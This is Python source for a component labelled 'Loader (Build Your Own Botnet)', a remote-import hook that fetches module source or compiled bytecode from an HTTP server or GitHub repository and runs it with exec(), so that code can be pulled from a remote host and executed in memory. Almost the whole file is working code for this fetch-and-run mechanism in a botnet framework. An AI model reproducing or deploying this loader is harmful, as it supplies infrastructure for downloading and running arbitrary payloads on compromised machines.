#!/usr/bin/python
# -*- coding: utf-8 -*-
'Loader (Build Your Own Botnet)'

# standard library
import imp
import sys
import logging
import contextlib
if sys.version_info[0] < 3:
    from urllib2 import urlopen
else:
    from urllib.request import urlopen

def log(info='', level='debug'):
    logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))

# main
class Loader(object):
    """
    The class that implements the remote import API.
    :param list modules: list of module/package names to make available for remote import
    :param str base_url: URL of directory/repository of modules being served through HTTPS

    """

    def __init__(self, modules, base_url):
        self.module_names = modules
        self.base_url = f'{base_url}/'
        self.non_source = False
        self.reload = False
        '''
        self.mod_msg = {}
        '''

    def find_module(self, fullname, path=None):
        log(level='debug', info= "FINDER=================")
        log(level='debug', info=f"Searching: {fullname}")
        log(level='debug', info=f"Path: {path}")
        log(level='info', info= "Checking if in declared remote module names...")
        if fullname.split('.')[0] not in self.module_names + list(
            {_.split('.')[0] for _ in self.module_names}
        ):
            log(level='info', info= "[-] Not found!")
            return None
        log(level='info', info= "Checking if built-in....")
        with contextlib.suppress(ImportError):
            file, filename, description = imp.find_module(fullname.split('.')[-1], path)
            if filename:
                log(level='info', info= "[-] Found locally!")
                return None
        log(level='info', info= "Checking if it is name repetition... ")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            log(level='info', info= "[-] Found locally!")
            return None
        '''
        msg = self.__get_source(fullname,path)
        if msg==None:
            return None
        is_package,final_url,source_code=msg
        self.mod_msg.setdefault(fullname,MsgClass(is_package,final_url,source_code))
        '''
        log(level='info', info=f"[+] Module/Package '{fullname}' can be loaded!")
        return self

    def load_module(self, name):
        '''
        mod_msg=self.mod_msg.get(fullname)
        '''
        imp.acquire_lock()
        log(level='debug', info= "LOADER=================")
        log(level='debug', info=f"Loading {name}...")
        if name in sys.modules and not self.reload:
            log(level='info', info=f'[+] Module "{name}" already loaded!')
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules and not self.reload:
            log(level='info', info=f'[+] Module "{name}" loaded as a top level module!')
            imp.release_lock()
            return sys.modules[name.split('.')[-1]]
        module_url = f"{self.base_url}{name.replace('.', '/')}.py"
        package_url = f"{self.base_url}{name.replace('.', '/')}/__init__.py"
        zip_url = f"{self.base_url}{name.replace('.', '/')}.zip"
        final_url = None
        final_src = None
        try:
            log(
                level='debug',
                info=f"Trying to import '{name}' as package from: '{package_url}'",
            )
            package_src = None
            if self.non_source:
                package_src = self.__fetch_compiled(package_url)
            if package_src is None:
                package_src = urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            log(level='info', info=f"[-] '{name}' is not a package ({str(e)})")
        if final_src is None:
            try:
                log(
                    level='debug',
                    info=f"[+] Trying to import '{name}' as module from: '{module_url}'",
                )
                module_src = None
                if self.non_source:
                    module_src = self.__fetch_compiled(module_url)
                if module_src is None:
                    module_src = urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                log(level='info', info=f"[-] '{name}' is not a module ({str(e)})")
                imp.release_lock()
                return None
        log(level='debug', info=f"[+] Importing '{name}'")
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name.rpartition('.')[0]
        else:
            mod.__package__ = name
            mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        log(level='debug', info=f"[+] Ready to execute '{name}' code")
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        log(level='info', info=f"[+] '{name}' imported succesfully!")
        imp.release_lock()
        return mod
    
    '''
    def __get_source(self,fullname,path):
        url=self.baseurl+"/".join(fullname.split("."))
        source=None
        is_package=None
        
        # Check if it's a package
        try:
            final_url=url+"/__init__.py"
            source = urlopen(final_url).read()
            is_package=True
        except Exception as e:
            log(level='debug', info= "[-] %s!" %e)
            
        # A normal module
        if is_package == None :  
            try:
                final_url=url+".py"
                source = urlopen(final_url).read()
                is_package=False
            except Exception as e:
                log(level='debug', info= "[-] %s!" %e)
                return None
                
        return is_package,final_url,source
    '''
    
    def __fetch_compiled(self, url):
        import marshal
        try:
            module_compiled = urlopen(f'{url}c').read()
            with contextlib.suppress(ValueError):
                return marshal.loads(module_compiled[8:])
            with contextlib.suppress(ValueError):
                return marshal.loads(module_compiled[12:])
        except IOError as e:
            log(
                level='debug',
                info=f"[-] No compiled version ('.pyc') for '{url.split('/')[-1]}' module found!",
            )
        return None

def __create_github_url(username, repo, branch='master'):
    github_raw_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'
    return github_raw_url.format(user=username, repo=repo, branch=branch)

def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
    if username is None or repo is None:
        raise Exception("'username' and 'repo' parameters cannot be None")
    if commit and branch:
        raise Exception("'branch' and 'commit' parameters cannot be both set!")
    if commit:
        branch = commit
    if not branch:
        branch = 'master'
    if not module:
        module = repo
    if type(module) == str:
        module = [module]
    url = url_builder(username, repo, branch)
    return add_remote_repo(module, url)

def add_remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Function that creates and adds to the 'sys.meta_path' an Loader object.
    The parameters are the same as the Loader class contructor.
    """
    importer = Loader(modules, base_url)
    sys.meta_path.insert(0, importer)
    return importer

def remove_remote_repo(base_url):
    """
    Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
    """
    for importer in sys.meta_path:
        with contextlib.suppress(AttributeError):
            if importer.base_url.startswith(base_url):  # an extra '/' is always added
                sys.meta_path.remove(importer)
                return True
    return False

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """
    Context Manager that provides remote import functionality through a URL.
    The parameters are the same as the Loader class contructor.
    """
    importer = add_remote_repo(modules, base_url)
    yield
    remove_remote_repo(base_url)

@contextlib.contextmanager
def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
    """
    Context Manager that provides import functionality from Github repositories through HTTPS.
    The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
    """
    importer = _add_git_repo(__create_github_url,
        username, repo, module=module, branch=branch, commit=commit)
    yield
    remove_remote_repo(importer.base_url)
